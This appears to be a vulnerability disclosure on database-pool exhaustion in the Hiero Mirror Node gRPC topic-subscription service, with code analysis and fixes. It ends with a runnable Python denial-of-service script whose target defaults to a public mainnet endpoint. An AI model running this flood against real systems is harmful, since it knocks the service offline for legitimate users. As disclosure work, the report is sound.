### Title
Unbounded Concurrent Subscription DB Query Amplification via Unauthenticated gRPC Subscriptions (Non-Network DoS)

### Summary
An unauthenticated external user can open an arbitrary number of gRPC connections to `subscribeTopic`, each triggering `PollingTopicMessageRetriever.retrieve()` in throttled mode with `numRepeats=Long.MAX_VALUE`. When directed at a topic with a large number of historical messages, each subscription issues a DB query every 2 seconds for the full 60-second timeout window. With no global subscription cap enforced and only a per-connection call limit of 5, an attacker opening many connections simultaneously can saturate the database connection pool and cause a non-network DoS.

### Finding Description

**Exact code path:**

In `PollingTopicMessageRetriever.retrieve()`, when called with `throttled=true` (which is always the case from `TopicMessageServiceImpl.subscribeTopic()` at line 63), the `PollingContext` constructor sets:

```java
// RetrieverProperties.java defaults:
// pollingFrequency = 2s, timeout = 60s, maxPageSize = 1000
if (throttled) {
    numRepeats = Long.MAX_VALUE;          // line 99
    frequency = retrieverProperties.getPollingFrequency();  // 2s default
    maxPageSize = retrieverProperties.getMaxPageSize();     // 1000 default
}
```

The repeat loop is:
```java
.repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())  // line 52
        .withFixedDelay(context.getFrequency()))   // 2s
.timeout(retrieverProperties.getTimeout(), scheduler)  // 60s hard stop
```

**Root cause — failed assumption in `isComplete()`:**

```java
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;  // line 125
    }
    return limitHit;
}
```

`pageSize` is reset to `0` at the start of every `poll()` call (line 73) and incremented by `onNext`. The design assumes that when a full page (1000 rows) is returned, there may be more data, so polling continues. On a topic with millions of historical messages, every page returns exactly 1000 rows, so `isComplete()` always returns `false`. The subscription then polls the DB every 2 seconds for the entire 60-second timeout window — up to **~30 DB queries per subscription**.

**No authentication or subscription cap is enforced:**

- `ConsensusController.subscribeTopic()` accepts any unauthenticated gRPC call and passes it directly to `topicMessageService.subscribeTopic()`.
- `subscriberCount` in `TopicMessageServiceImpl` (line 48) is a **metrics gauge only** — it is never checked against any threshold to reject new subscriptions.
- `maxConcurrentCallsPerConnection = 5` (NettyProperties, line 14) limits calls **per connection**, but there is no limit on the number of connections from a single IP or globally.

**Exploit flow:**

1. Attacker identifies (or uses an existing) topic with ≥ 1000 historical messages on mainnet (many such topics exist publicly).
2. Attacker opens `C` TCP connections to the gRPC port (port 5600), each with 5 concurrent `subscribeTopic` calls using `startTime=0` (beginning of time) and no `limit`.
3. Each of the `5C` subscriptions enters the throttled polling loop: DB query → 2s wait → DB query → … for 60 seconds.
4. DB query rate = `5C / 2` queries/second. With `C=100` connections: **250 DB queries/second** sustained for 60 seconds.
5. After 60s, the timeout fires and subscriptions terminate. The attacker immediately reconnects and repeats.
6. The HikariCP connection pool (finite size) is exhausted; legitimate importer and REST API queries are starved.

### Impact Explanation

Database connection pool exhaustion causes the gRPC mirror node to fail to serve legitimate subscribers and can cascade to the REST API and importer if they share the same DB instance. The attack is purely application-layer (no network flooding required), requires no credentials, and is repeatable indefinitely. The affected service (Hiero Mirror Node gRPC) is a critical infrastructure component for HCS (Hedera Consensus Service) consumers. Severity is high because: (a) no privilege is required, (b) the amplification factor is large (1 connection → 30 DB queries), and (c) there is no self-healing — the attacker can sustain the attack continuously by reconnecting.

### Likelihood Explanation

Any internet-accessible deployment of the mirror node gRPC service is exploitable. The attacker needs only a standard gRPC client (e.g., `grpcurl`, the Hedera SDK, or a custom script), knowledge of any topic ID with historical messages (all topic IDs are public on-chain), and enough TCP connections (easily achievable from a single host or a small botnet). No special protocol knowledge, credentials, or on-chain transactions are required. The attack is fully repeatable and automatable.

### Recommendation

1. **Enforce a global concurrent-subscription cap**: Check `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP connection rate limiting** at the Netty/load-balancer layer (e.g., `maxConnectionsPerIp` in `NettyServerBuilder` or an upstream proxy rule).
3. **Require a non-zero `startTime` close to the present** or cap the historical window an unauthenticated caller can query (e.g., reject `startTime` older than N days).
4. **Reduce `timeout` and increase `pollingFrequency`** for throttled mode to reduce the per-subscription DB query budget, or add a per-subscription query-count cap independent of `numRepeats`.
5. **Separate DB connection pools** for the retriever and the live listener so retriever exhaustion cannot starve the importer.

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mainnet-public-mirror.hedera.com:443"  # or self-hosted instance
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any topic with many messages
NUM_CONNECTIONS = 100
CALLS_PER_CONNECTION = 5  # maxConcurrentCallsPerConnection default

def flood_connection(_):
    creds = grpc.ssl_channel_credentials()
    channel = grpc.secure_channel(TARGET, creds)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(
            shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no limit, no end time → throttled mode, Long.MAX_VALUE repeats
    )
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        def consume():
            try:
                for _ in stub.subscribeTopic(request):
                    pass  # drain responses, keep subscription alive
            except Exception:
                pass
        t = threading.Thread(target=consume, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood_connection, args=(i,), daemon=True)
           for i in range(NUM_CONNECTIONS)]
for w in workers:
    w.start()
for w in workers:
    w.join()
# Result: 500 concurrent subscriptions each issuing a DB query every 2s
# = 250 DB queries/second sustained for 60s, then repeat
```

**Expected result**: DB connection pool alert fires (`hikaricp_connections_active / hikaricp_connections_max > 0.75`), legitimate gRPC and REST queries begin timing out or returning errors.